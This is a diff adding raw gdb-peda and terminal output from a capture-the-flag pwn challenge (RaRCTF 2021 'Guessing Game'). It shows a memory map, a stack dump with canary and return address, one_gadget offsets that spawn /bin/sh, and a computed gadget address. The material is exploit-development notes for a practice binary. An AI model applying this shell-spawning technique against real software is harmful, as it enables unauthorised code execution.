@@ -1,0 +1,51 @@
+gdb-peda$ vmmap
+Start              End                Perm	Name
+0x0000555555554000 0x0000555555555000 r--p	/home/mito/CTF/RaRCTF_2021/Pwn_The_Guessing_Game_300/guess
+0x0000555555555000 0x0000555555556000 r-xp	/home/mito/CTF/RaRCTF_2021/Pwn_The_Guessing_Game_300/guess
+0x0000555555556000 0x0000555555557000 r--p	/home/mito/CTF/RaRCTF_2021/Pwn_The_Guessing_Game_300/guess
+0x0000555555557000 0x0000555555558000 r--p	/home/mito/CTF/RaRCTF_2021/Pwn_The_Guessing_Game_300/guess
+0x0000555555558000 0x0000555555559000 rw-p	/home/mito/CTF/RaRCTF_2021/Pwn_The_Guessing_Game_300/guess
+0x00007ffff7dbf000 0x00007ffff7de4000 r--p	/usr/lib/x86_64-linux-gnu/libc-2.31.so
+0x00007ffff7de4000 0x00007ffff7f5c000 r-xp	/usr/lib/x86_64-linux-gnu/libc-2.31.so
+0x00007ffff7f5c000 0x00007ffff7fa6000 r--p	/usr/lib/x86_64-linux-gnu/libc-2.31.so
+0x00007ffff7fa6000 0x00007ffff7fa7000 ---p	/usr/lib/x86_64-linux-gnu/libc-2.31.so
+0x00007ffff7fa7000 0x00007ffff7faa000 r--p	/usr/lib/x86_64-linux-gnu/libc-2.31.so
+0x00007ffff7faa000 0x00007ffff7fad000 rw-p	/usr/lib/x86_64-linux-gnu/libc-2.31.so
+0x00007ffff7fad000 0x00007ffff7fb3000 rw-p	mapped
+0x00007ffff7fcb000 0x00007ffff7fce000 r--p	[vvar]
+0x00007ffff7fce000 0x00007ffff7fcf000 r-xp	[vdso]
+0x00007ffff7fcf000 0x00007ffff7fd0000 r--p	/usr/lib/x86_64-linux-gnu/ld-2.31.so
+0x00007ffff7fd0000 0x00007ffff7ff3000 r-xp	/usr/lib/x86_64-linux-gnu/ld-2.31.so
+0x00007ffff7ff3000 0x00007ffff7ffb000 r--p	/usr/lib/x86_64-linux-gnu/ld-2.31.so
+0x00007ffff7ffc000 0x00007ffff7ffd000 r--p	/usr/lib/x86_64-linux-gnu/ld-2.31.so
+0x00007ffff7ffd000 0x00007ffff7ffe000 rw-p	/usr/lib/x86_64-linux-gnu/ld-2.31.so
+0x00007ffff7ffe000 0x00007ffff7fff000 rw-p	mapped
+0x00007ffffffde000 0x00007ffffffff000 rw-p	[stack]
+0xffffffffff600000 0xffffffffff601000 --xp	[vsyscall]
+
+
+0x7fffffffdfb0:	0x0000000800000008	0xfd44595748cf208a
+0x7fffffffdfc0:	0x4141414141414141	0x000055555555500a
+0x7fffffffdfd0:	0x00007fffffffe0d0	0x6cc4f309ce86c800
+0x7fffffffdfe0:	0x0000000000000000	0x00007ffff7de60b3
+0x7fffffffdff0:	0x00007ffff7ffc620	0x00007fffffffe0d8
+0x7fffffffe000:	0x0000000100000000	0x000055555555521d
+
+mito@ubuntu:~/CTF/RaRCTF_2021/Pwn_The_Guessing_Game_300$ one_gadget /lib/x86_64-linux-gnu/libc.so.6
+0xe6aee execve("/bin/sh", r15, r12)
+constraints:
+  [r15] == NULL || r15 == NULL
+  [r12] == NULL || r12 == NULL
+
+0xe6af1 execve("/bin/sh", r15, rdx)
+constraints:
+  [r15] == NULL || r15 == NULL
+  [rdx] == NULL || rdx == NULL
+
+0xe6af4 execve("/bin/sh", rsi, rdx)
+constraints:
+  [rsi] == NULL || rsi == NULL
+  [rdx] == NULL || rdx == NULL
+
+
+7ffff7dbf000 + 0xe6af1 = 0x7FFFF7EA5AF1
